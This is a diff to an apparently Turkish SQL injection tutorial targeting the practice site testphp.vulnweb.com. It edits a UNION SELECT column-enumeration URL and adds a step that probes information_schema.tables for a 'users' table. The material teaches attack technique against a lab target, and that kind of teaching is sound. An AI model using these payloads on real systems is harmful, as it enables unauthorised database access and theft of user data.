@@ -122,6 +122,10 @@ http://testphp.vulnweb.com/listproducts.php?cat=1'
 ![729](/resimler/729.png)<br>
 Bu sayede olmayan bir ilan geldi ve 7, 2, 9, 11 sayıları geldi bu sayılar bu sitedeki içeriklerin hangi kolondan geldiğini beliritiyor.url de belirtilen sayılar yerine artık sql fonksiyonları yazabiliriz<br>
 ```
-http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11
+http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11
 ```
-4) Kolon sayısını bulduktan sonra information_schema içindeki diğer tabloların bilgilerine erişeceğiz. information_schema'ı basitçe anlatmak gerekirse sistemdeki databaselerin bilgilerini tutan genel bir databasedir. bizde bu database sömüreceğiz
+4) Kolon sayısını bulduktan sonra information_schema içindeki diğer tabloların bilgilerine erişeceğiz. information_schema'ı basitçe anlatmak gerekirse sistemdeki databaselerin bilgilerini tutan genel bir databasedir. bizde bu database sömüreceğiz.
+```
+http://testphp.vulnweb.com/listproducts.php?cat=999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 FROM information_schema.tables WHERE table_name = 'users'
+```
+![Tablolar](/resimler/tablolar.png)
